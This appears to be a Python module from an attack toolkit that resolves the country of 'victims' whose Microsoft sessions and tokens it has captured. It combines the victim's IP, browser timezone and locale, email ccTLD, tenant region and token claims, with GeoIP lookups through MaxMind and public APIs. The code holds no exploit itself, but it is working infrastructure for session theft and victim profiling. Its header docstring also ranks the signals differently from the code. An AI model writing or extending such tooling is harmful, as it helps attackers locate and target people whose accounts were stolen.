# evildev/geoip.py
"""
Country resolution for captured sessions.

Priority (highest -> lowest confidence):
  1. timezone        - IANA zone reported by the victim's browser
                       (populated by POST /api/session/context)
  2. victim_ip       - GeoIP on the visitor's real egress IP
                       (also from /api/session/context)
  3. locale          - BCP-47 region subtag (e.g. de-AT -> AT)
  4. email_tld       - ccTLD of the UPN. Reflects registration, not
                       physical location. Vanity ccTLDs like .li, .io
                       are skip-listed so they never emit a flag.
  5. tenant_region   - Microsoft's coarse regional scope (EU/NA/AS/...)
  6. server_ip       - Microsoft's own server IP from the token's
                       ipaddr claim. Never the victim; last resort.

Caching: in-memory LRU. The same IPs and TLDs recur constantly.
"""

import ipaddress
import json
import os
import re
import threading
import time
from pathlib import Path
from typing import Optional, Tuple
from functools import lru_cache

try:
    import maxminddb
except ImportError:
    maxminddb = None

try:
    import requests
except ImportError:
    requests = None


# ---------------------------------------------------------------------------
# Lazy singleton for the MaxMind reader
# ---------------------------------------------------------------------------

_mmdb_lock = threading.Lock()
_mmdb_reader = None
_mmdb_path = os.environ.get(
    'GEOIP_DB_PATH',
    str(Path(__file__).resolve().parents[0] / 'data' / 'GeoLite2-Country.mmdb'),
)


def _get_mmdb_reader():
    global _mmdb_reader
    if _mmdb_reader is not None:
        return _mmdb_reader
    if maxminddb is None:
        return None
    if not Path(_mmdb_path).exists():
        return None
    with _mmdb_lock:
        if _mmdb_reader is None:
            try:
                _mmdb_reader = maxminddb.open_database(_mmdb_path)
            except Exception:
                _mmdb_reader = None
    return _mmdb_reader


# ---------------------------------------------------------------------------
# Online fallback with a small cache
# ---------------------------------------------------------------------------

_online_cache: dict = {}
_online_cache_lock = threading.Lock()
_ONLINE_CACHE_TTL = 6 * 3600     # 6 hours
_ONLINE_TIMEOUT = 2.0


def _lookup_online(ip: str) -> Optional[str]:
    """Best-effort online lookup. Returns ISO-3166-alpha-2 or None."""
    if requests is None:
        return None
    now = time.time()
    with _online_cache_lock:
        cached = _online_cache.get(ip)
        if cached and (now - cached[1]) < _ONLINE_CACHE_TTL:
            return cached[0]

    provider = os.environ.get('GEOIP_ONLINE_PROVIDER', 'ipapi').lower()
    try:
        if provider == 'ip-api':
            # http (free tier), rate limited to 45 req/min
            resp = requests.get(
                f'http://ip-api.com/json/{ip}?fields=status,countryCode',
                timeout=_ONLINE_TIMEOUT,
            )
            data = resp.json() if resp.ok else {}
            code = (data.get('countryCode') or '').upper() if data.get('status') == 'success' else None
        elif provider == 'ipinfo':
            resp = requests.get(
                f'https://ipinfo.io/{ip}/json',
                timeout=_ONLINE_TIMEOUT,
            )
            data = resp.json() if resp.ok else {}
            code = (data.get('country') or '').upper() or None
        else:  # ipapi (default)
            resp = requests.get(
                f'https://ipapi.co/{ip}/json/',
                timeout=_ONLINE_TIMEOUT,
                headers={'User-Agent': 'vault/1.0'},
            )
            data = resp.json() if resp.ok else {}
            code = (data.get('country_code') or '').upper() or None

        if code and not re.match(r'^[A-Z]{2}$', code):
            code = None
    except Exception:
        code = None

    with _online_cache_lock:
        _online_cache[ip] = (code, now)
        if len(_online_cache) > 4096:
            # crude eviction: drop the oldest half
            oldest = sorted(_online_cache.items(), key=lambda kv: kv[1][1])
            for k, _ in oldest[: len(oldest) // 2]:
                _online_cache.pop(k, None)

    return code


# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------

def country_from_ip(ip: str) -> Optional[Tuple[str, str]]:
    """Return (country_code, source) for an IP.

    country_code is ISO-3166 alpha-2, uppercase. source is one of
    'maxmind' or 'online'.
    """
    if not ip:
        return None
    try:
        parsed = ipaddress.ip_address(ip.strip())
    except ValueError:
        return None
    if parsed.is_private or parsed.is_loopback or parsed.is_reserved:
        return None

    reader = _get_mmdb_reader()
    if reader is not None:
        try:
            rec = reader.get(str(parsed))
            if rec:
                iso = (rec.get('country') or {}).get('iso_code')
                if iso:
                    return iso.upper(), 'maxmind'
        except Exception:
            pass

    code = _lookup_online(str(parsed))
    if code:
        return code, 'online'
    return None


# Timezone -> representative country. This is a browser-side hint and a
# better signal for victim location than the tenant's coarse region.
_TIMEZONE_TO_COUNTRY = {
    'America/New_York': 'US', 'America/Chicago': 'US', 'America/Denver': 'US',
    'America/Los_Angeles': 'US', 'America/Phoenix': 'US', 'America/Anchorage': 'US',
    'Pacific/Honolulu': 'US', 'America/Toronto': 'CA', 'America/Vancouver': 'CA',
    'America/Edmonton': 'CA', 'America/Winnipeg': 'CA', 'America/Halifax': 'CA',
    'America/Mexico_City': 'MX', 'America/Monterrey': 'MX', 'America/Tijuana': 'MX',
    'America/Sao_Paulo': 'BR', 'America/Buenos_Aires': 'AR', 'America/Santiago': 'CL',
    'America/Bogota': 'CO', 'America/Lima': 'PE', 'America/Caracas': 'VE',
    'Europe/London': 'GB', 'Europe/Dublin': 'IE', 'Europe/Paris': 'FR',
    'Europe/Berlin': 'DE', 'Europe/Madrid': 'ES', 'Europe/Rome': 'IT',
    'Europe/Amsterdam': 'NL', 'Europe/Brussels': 'BE', 'Europe/Zurich': 'CH',
    'Europe/Vienna': 'AT', 'Europe/Stockholm': 'SE', 'Europe/Oslo': 'NO',
    'Europe/Copenhagen': 'DK', 'Europe/Helsinki': 'FI', 'Europe/Warsaw': 'PL',
    'Europe/Prague': 'CZ', 'Europe/Budapest': 'HU', 'Europe/Lisbon': 'PT',
    'Europe/Athens': 'GR', 'Europe/Bucharest': 'RO', 'Europe/Kyiv': 'UA',
    'Europe/Moscow': 'RU', 'Europe/Istanbul': 'TR', 'Asia/Jerusalem': 'IL',
    'Asia/Dubai': 'AE', 'Asia/Riyadh': 'SA', 'Africa/Cairo': 'EG',
    'Africa/Johannesburg': 'ZA', 'Africa/Lagos': 'NG', 'Africa/Nairobi': 'KE',
    'Asia/Tokyo': 'JP', 'Asia/Seoul': 'KR', 'Asia/Shanghai': 'CN',
    'Asia/Hong_Kong': 'HK', 'Asia/Taipei': 'TW', 'Asia/Singapore': 'SG',
    'Asia/Kuala_Lumpur': 'MY', 'Asia/Jakarta': 'ID', 'Asia/Bangkok': 'TH',
    'Asia/Manila': 'PH', 'Asia/Kolkata': 'IN', 'Asia/Karachi': 'PK',
    'Asia/Dhaka': 'BD', 'Asia/Kathmandu': 'NP', 'Asia/Colombo': 'LK',
    'Australia/Sydney': 'AU', 'Australia/Melbourne': 'AU', 'Australia/Brisbane': 'AU',
    'Australia/Perth': 'AU', 'Australia/Adelaide': 'AU', 'Pacific/Auckland': 'NZ',
}


def _timezone_to_country(tz: Optional[str]) -> Optional[str]:
    if not tz:
        return None
    tz = str(tz).strip()
    if not tz or '/' not in tz:
        return None
    return _TIMEZONE_TO_COUNTRY.get(tz)


# Map of region_scope values that Microsoft emits to a "representative"
# country. This is a coarse fallback only. The region covers multiple
# countries, so the flag is a hint, not a fact.
_REGION_TO_COUNTRY = {
    'NA': 'US',
    'EU': 'DE',
    'AS': 'SG',
    'OC': 'AU',
    'SA': 'BR',
    'AF': 'ZA',
    'ME': 'AE',
}


# Common multi-label TLDs. Taken from the public suffix list, trimmed
# to the ones most likely to show up in a UPN. Add more as needed.
_MULTI_LABEL_TLDS = {
    'co.uk', 'co.jp', 'co.kr', 'co.in', 'co.nz', 'co.za', 'co.il',
    'com.au', 'com.br', 'com.mx', 'com.tr', 'com.tw', 'com.hk',
    'com.sg', 'com.my', 'com.ph', 'com.ar', 'com.co', 'com.pe',
    'gov.uk', 'gov.au', 'gov.in',
    'ac.uk', 'ac.jp', 'ac.nz',
    'org.uk', 'org.au',
    'net.au', 'net.nz',
}


# A small map of gTLDs that strongly imply a country. These are
# second-level gTLDs that were delegated to a specific country.
# Not exhaustive; the ccTLD heuristic catches most of the rest.
_GTLD_TO_COUNTRY = {
    'us': 'US',      # .us is a ccTLD, but sometimes misclassified
}


# ccTLDs that are widely repurposed as gTLDs. A flag would be
# misleading, so we skip them. Defined before _tld_to_country so the
# name is bound by the time it's first read.
#
# .li is Liechtenstein's ccTLD but is frequently used as a vanity TLD
# for "link" / personal branding domains. Flagging every .li UPN as
# Liechtenstein produces wrong countries for real users on vanity
# domains (e.g. stayhome.li). Same logic applies to .nu, .su, and the
# existing entries.
_GTLD_LIKE = {
    'io',   # British Indian Ocean Territory, used by every startup
    'ai',   # Anguilla, used by AI companies
    'co',   # Colombia, used as a .com substitute
    'me',   # Montenegro, used as a personal TLD
    'tv',   # Tuvalu, used by streaming
    'cc',   # Cocos Islands, used by file sharing
    'fm',   # Micronesia, used by radio
    'gg',   # Guernsey, used by gaming
    'to',   # Tonga, used by shorteners
    'ly',   # Libya, used by shorteners
    'gd',   # Grenada
    'vc',   # St Vincent
    'ws',   # Samoa
    'sh',   # St Helena
    'li',   # Liechtenstein, used as a vanity "link" TLD
    'nu',   # Niue, used as a vanity TLD
    'su',   # Soviet Union, legacy vanity TLD
}


def _domain_from_email(email: str) -> Optional[str]:
    if not email or '@' not in email:
        return None
    domain = email.rsplit('@', 1)[1].strip().lower()
    return domain or None


def _tld_to_country(domain: str) -> Optional[str]:
    """Extract a country code from a domain's ccTLD.

    Handles multi-label public suffixes like co.uk, com.au.
    Returns None for gTLDs (.com, .org, .net, .io, .ai, .li, .dev, ...).
    """
    if not domain:
        return None
    parts = domain.split('.')
    if len(parts) < 2:
        return None

    # Try the 2-label suffix first
    if len(parts) >= 3:
        two = '.'.join(parts[-2:])
        if two in _MULTI_LABEL_TLDS:
            # The country code is the last label
            tld = parts[-1]
            if re.match(r'^[a-z]{2}$', tld) and tld not in _GTLD_LIKE:
                return tld.upper()

    tld = parts[-1]
    # gTLDs are 3+ chars and won't match a country
    if not re.match(r'^[a-z]{2}$', tld):
        return None
    # .io, .ai, .co, .me, .tv, .cc, .fm, .gg, .li, ... are ccTLDs in
    # the strict sense but are commonly used as generic/vanity TLDs.
    # Don't emit a flag for those, since it would be misleading.
    if tld in _GTLD_LIKE:
        return None
    return tld.upper()


def _locale_to_country(locale: Optional[str]) -> Optional[str]:
    """Extract an ISO-3166 alpha-2 region from a BCP-47 locale tag.

    'de-AT' -> 'AT', 'en-US' -> 'US', 'pt_BR' -> 'BR'.
    Returns None when the locale has no explicit region subtag or the
    region is a vanity TLD (so 'en-LI' doesn't produce a Liechtenstein
    flag either).
    """
    if not locale:
        return None
    tag = str(locale).strip().replace('_', '-')
    if not tag:
        return None
    parts = tag.split('-')
    if len(parts) < 2:
        return None
    region = parts[-1].upper()
    if not re.match(r'^[A-Z]{2}$', region):
        return None
    if region.lower() in _GTLD_LIKE:
        return None
    return region


def resolve_country(
    ip: Optional[str] = None,
    email: Optional[str] = None,
    tenant_region_scope: Optional[str] = None,
    timezone: Optional[str] = None,
    server_ip: Optional[str] = None,
    locale: Optional[str] = None,
) -> dict:
    """Combine all available signals into one country resolution.

    Victim-side (highest -> lowest confidence):
      victim_ip -> timezone -> locale -> email_tld -> tenant_region
    Server-side (never wins for victim location):
      server_ip (legacy alias for the token's ipaddr claim)

    `ip` is the visitor's real egress IP (set by the caller from
    session['victim_ip']). `server_ip` is Microsoft's ipaddr claim and
    is only used as a last resort.
    """
    signals = {}

    # 1. victim_ip — GeoIP on the address that actually hit us.
    # This is the strongest data-backed signal when an IP is available.
    victim_ip_code = None
    if ip:
        result = country_from_ip(ip)
        if result:
            victim_ip_code = result[0]
            signals['victim_ip'] = victim_ip_code

    # 2. timezone — the browser's IANA zone, useful as a secondary hint.
    tz_code = _timezone_to_country(timezone)
    if tz_code:
        signals['timezone'] = tz_code

    # 3. locale — BCP-47 region subtag. Beats a misleading ccTLD.
    locale_code = _locale_to_country(locale)
    if locale_code:
        signals['locale'] = locale_code

    # 4. email_tld — the UPN's ccTLD. Weak: reflects registration,
    #    not physical location. Vanity TLDs are skip-listed.
    email_code = None
    domain = _domain_from_email(email or '')
    if domain:
        tld_code = _tld_to_country(domain)
        if tld_code:
            email_code = tld_code
            signals['email_tld'] = email_code

    # 5. tenant_region — coarse Microsoft classification.
    region_code = None
    if tenant_region_scope:
        mapped = _REGION_TO_COUNTRY.get(str(tenant_region_scope).upper())
        if mapped:
            region_code = mapped
            signals['tenant_region'] = str(tenant_region_scope).upper()
            signals['tenant_region_mapped'] = mapped

    # 6. server_ip — Microsoft's server IP from the token's ipaddr
    #    claim. Never the victim. Last resort.
    server_ip_code = None
    if server_ip:
        result = country_from_ip(server_ip)
        if result:
            server_ip_code = result[0]
            signals['server_ip'] = server_ip_code

    if victim_ip_code:
        return {'code': victim_ip_code, 'source': 'victim_ip', 'signals': signals}
    if tz_code:
        return {'code': tz_code, 'source': 'timezone', 'signals': signals}
    if locale_code:
        return {'code': locale_code, 'source': 'locale', 'signals': signals}
    if email_code:
        return {'code': email_code, 'source': 'email_tld', 'signals': signals}
    if region_code:
        return {'code': region_code, 'source': 'tenant_region', 'signals': signals}
    if server_ip_code:
        return {'code': server_ip_code, 'source': 'server_ip', 'signals': signals}
    return {'code': None, 'source': None, 'signals': signals}
